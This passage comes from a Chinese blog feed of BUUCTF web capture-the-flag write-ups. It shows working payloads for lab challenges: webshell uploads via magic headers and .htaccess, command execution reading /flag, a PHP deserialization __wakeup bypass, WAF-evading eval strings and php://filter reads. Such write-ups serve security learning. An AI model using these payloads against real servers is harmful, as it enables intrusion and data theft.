：</strong></p><p>这段代码创建了一个线程对象，该线程对象的目标函数是 <code>get_content</code> ，并传入了一个参数 <code>i</code>  作为参数。 <code>get_content</code>  函数是线程执行的目标函数，而 <code>args=(i,)</code>  是将参数 <code>i</code>  作为元组传递给 <code>get_content</code>  函数。这样，当线程开始执行时，它会调用 <code>get_content(i)</code>  函数。</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c07.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>利用文件：  <code>xk0SzyKwfzw.php</code> ，利用的参数： <code>Efa5BVG</code></p><p>接下来就是利用这个文件和参数获取 flag 了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=ls%20/;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c08.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><code>ls;</code>  访问当前目录， <code>ls \;</code>  访问上一级， <code>%20</code>  是 url 编码，这题直接用空格也是可以的，看到 flag 文件直接获取就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=cat /flag;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c09.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;roarctf-2019easy-java&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#roarctf-2019easy-java&quot;&gt;#&lt;/a&gt; [RoarCTF 2019]Easy Java&lt;/h2&gt;</summary>
    
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/categories/buuctf/"/>
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题2</title>
    <link href="https://dr4x3zz.github.io/2024/01/24/buuctf%E5%88%B7%E9%A2%982/"/>
    <id>https://dr4x3zz.github.io/2024/01/24/buuctf%E5%88%B7%E9%A2%982/</id>
    <published>2024-01-24T12:03:11.000Z</published>
    <updated>2024-01-27T07:50:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019upload"><a class="markdownIt-Anchor" href="#极客大挑战-2019upload">#</a> [极客大挑战 2019] Upload</h2><span id="more"></span><p>上传带有一句话木马的文件，好像对内容有检测</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a01.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这里记录一个知识点：<strong>文件幻术头</strong></p><p>好像是和一个函数有关 getimagesize () 函数。每种类型的图片内容最开头会有一个标志性的头部，这个头部被称为文件幻术。</p><p>jpg 对于前面的 16 进制字符是：FFD8FFE000104A464946</p><p>png 是：89504E47</p><p>gif 是：474946383961</p><p>也可以直接把 16 进制字符加在包的首部</p><p>所以这里尝试使用文件幻术头来绕过这个内容的检测</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a02.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这里需要修改一下代码他会检测 &lt;? 所以要使用另一种写法</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a04.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>接下来就是常规的上传抓包改后缀了</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a03.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>经过尝试要使用 phtml 才能成功</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a05.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这里没有给出存储路径，我们需要猜测存储的路径，然后用蚁剑连接</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a06.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>ok 在 upload 下，蚁剑连接</p><p>打开后直接 cat /flag 就可以得到 flag，直接找的话在最外层文件夹下</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a07.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="极客大挑战-2019php"><a class="markdownIt-Anchor" href="#极客大挑战-2019php">#</a> [极客大挑战 2019] PHP</h2><p>进入页面，他说他有一个备份网站的习惯</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a08.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>所以尝试访问网站源码备份文件，这里记录一个知识点</p><blockquote><p>常见的网站源码备份文件后缀：</p><p>tar.gz，zip，rar，tar</p><p>常见的网站源码备份文件名：</p><p>web，website，backup，back，www，wwwroot，temp</p></blockquote><p>本题是 www.zip</p><p>下载后，里面有个 flag.php 一眼假哈哈哈</p><p>index.php 里面有一小段有用的代码</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a09.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>重点内容在 class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题利用__construct 构造函数来进行 username 和 password 的对应，之后__wakeup () 让 username 变量等于 guest，下面的比较相等则输出 flag，现在重点是绕过__wakeup () 这个函数</p><p>这里记录一个知识点</p><blockquote><p>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用__wakeup () 成员函数（如果存在的话）</p></blockquote><p>这里记录一下绕过__wakeup () 的一个方法<strong>属性个数不匹配 (cve-2016-7124)：</strong></p><p>影响范围：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><blockquote><p>在反序列化的过程中，会先调用__wakeup () 方法在进行 unserilize (), 但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，__wakeup () 的执行会被跳过</p></blockquote><p>知道了这个我们就尝试修改属性个数来绕过__wakeup ()</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$select</span> = <span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">serialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出后的内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>修改个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>这里修改个数还是不行，我网上找了一会，发现这个变量为 private</p><p>private 声明的字段为私有字段，只在声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上 \0 的前缀。字符串长度也包括所加前缀的长度，于是修改 payload 为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a10.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>ok 拿到 flag</p><p 8a8789b4-ca89-492d-9c83-fdee94297560>flag</p><h2 id="actf2020-新生赛backupfile-1"><a class="markdownIt-Anchor" href="#actf2020-新生赛backupfile-1">#</a> [ACTF2020 新生赛] BackupFile 1</h2><p>这道题目的文件就是备份文件的意思，使用 dirsearch 扫描，省去猜测文件名的时间</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a11.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到有一个 index.php.bak，下载下来</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a12.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>用记事本打开</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记录一个知识点</p><blockquote><p>在 php 中：<mark>为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如 a=123 和 b=123admin456 进行</mark>比较时。则 b 只会截取前面的整数部分。即 b 转化成 123。</p></blockquote><p>所以这道题就很简单了只需要让 key=123 就好了</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a13.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 43561224-3d99-4f42-807d-15c0a2f61862>flag</p><h2 id="roarctf-2019easy-calc"><a class="markdownIt-Anchor" href="#roarctf-2019easy-calc">#</a> [RoarCTF 2019]Easy Calc</h2><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a14.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>f12 可以看到还有一个 calc.php 访问一下</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a15.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>写一下 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=2;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p>这段 payload? 和 num 之间有个空格，删去的话就无法访问，这是用来绕过 waf（web 防火墙），参考链接：<a href="https://blog.csdn.net/weixin_45642610/article/details/112545583">https://blog.csdn.net/weixin_45642610/article/details/112545583</a></p><p>解答我也抄一下：这是 php 的机制，在传进 php 代码的 url 时，一些字符会被忽略或变成_。因为 php 一般是这样 <code>$_GET['num']</code>  获取 url 传进来的参数，当有一些奇怪的字符和参数写在一起时，如 <code>%[num%id</code> ，它会变成 <code>$_GET['num_id']</code> 。所以在 num 前加个空格可以绕过 waf 并且 php 会把它当成正常 <code>num</code>  使用，此时并不是’num’而是‘num’。</p><p>看的我还是云里雾里的。。。</p><p>var_dump () 用来打印</p><p>scandir () 用来获取目录文件</p><p>chr (47) 是 / 的 ASCII 编码，因为 / 被过滤了所以要用 ASCII</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a16.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以猜测到 flag 应该是在 f1agg 里的</p><p>这里做一个小记录</p><blockquote><p>对于 scandir (’.’) 和 scandir (chr (47)) 的范围</p><p>前者应该是当前目录下的所有文件的名称，后者像是上一级的目录</p></blockquote><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=2;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p><code>.</code>  是 php 的连字符</p><p>chr () 里面都是 ASCII 码</p><p>47 是 <code>\</code></p><p>102 是 <code>f</code></p><p>49 是 <code>1</code></p><p>97 是 <code>a</code></p><p>103 是 <code>g</code></p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a17.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 6c3b33e8-b40d-4604-85b9-8c7895179796>flag</p><h2 id="极客大挑战-2019buyflag"><a class="markdownIt-Anchor" href="#极客大挑战-2019buyflag">#</a> [极客大挑战 2019] BuyFlag</h2><p>f12 查看源码，这就是弱比较吧，我直接 post password=404adsad 来绕过这个 ==，但是失败了，是我想得太简单了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password == 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里做了很多尝试，抓包后发现，cookie 有个 user=0，不改动的话一直都是</p><p>Only Cuit’s students can buy the FLAG</p><p>把 user 改为 1，就是学生身份了</p><p>这样再次 post 它提示我 Pay for the flag!<span class="spoiler" title="...">hacker</span>!</p><p>应该是说我需要有 100000000 money</p><p>上面的代码说了 <code>~~~post money and password~~~</code></p><p>所以也直接 post</p><p>然后告诉我 Nember lenth is too long</p><p>这里用科学计数法 1e9</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=404asdb&amp;money=1e9</span><br></pre></td></tr></table></figure><p><img src alt><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a18.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a18"></p><p>成功得到 flag</p><p 12f260f7-aa39-4a80-883c-eda6ee7853c0>flag</p><h2 id="mrctf2020你传你呢"><a class="markdownIt-Anchor" href="#mrctf2020你传你呢">#</a> [MRCTF2020] 你传你🐎呢</h2><p>尝试上传一句话木马图片，抓包修改后缀的方法失败了</p><p>尝试使用.htaccess 内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;muma&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>意思就是把文件名叫做 muma 的文件当成 php 文件解析</p><p>这下就先上传.htaccess 在上传 muma.jpg</p><p>这里记得抓包修改 Content-Type 为 image/png 没有修改的话上传会失败</p><p><img src alt><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a19.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a19"></p><p>上传 muma.jpg</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a20.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>有路径回显，蚁剑连接</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a21.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>在最高一级目录里可以找到 flag</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a22.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p c7752e75-1425-4338-80dc-30d94cc7c20e>flag</p><h2 id="hctf-2018admin"><a class="markdownIt-Anchor" href="#hctf-2018admin">#</a> [HCTF 2018]admin</h2><p><strong>第一种</strong>：这一题的解法很多，因为是弱口令，所以可以用 bp 直接爆破</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a28.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a28.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>爆破得到密码是 123</p><p>登录就可以得到 flag</p><p><strong>第二种：<strong>留一下大佬的做法</strong> flask session 伪造</strong><a href="https://blog.csdn.net/weixin_45642610/article/details/112685368"> https://blog.csdn.net/weixin_45642610/article/details/112685368</a></p><p>我下载 flask 一直报错，下次再尝试</p><h2 id="zjctf-2019nizhuansiwei"><a class="markdownIt-Anchor" href="#zjctf-2019nizhuansiwei">#</a> [ZJCTF 2019]NiZhuanSiWei</h2><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a29.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a29.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>第一个绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))</span><br></pre></td></tr></table></figure><p>要求我们上传一个 txt 内容还需是 welcome to the zjctf</p><p>可以使用 data 伪协议写进去</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure><p>这里最好把 welcome to the zjctf 转成 base64 上传，不然有可能会被过滤，但是这道题没有，我就不转了</p><p><img src="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a30.png" class="lazyload" data-srcset="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/a30.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>接下来第二个绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">       echo &quot;Not now!&quot;;</span><br><span class="line">       exit(); </span><br><span class="line">   &#125;else&#123;</span><br><span class="line">       include($file);  //useless.php</span><br><span class="line">       $password = unserialize($password);</span><br><span class="line">       echo $password;</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure><p>preg_match 正则过滤了 flag，看了大佬的做法是利用 php://filter 伪协议来读取 useless.php</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>base64 解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        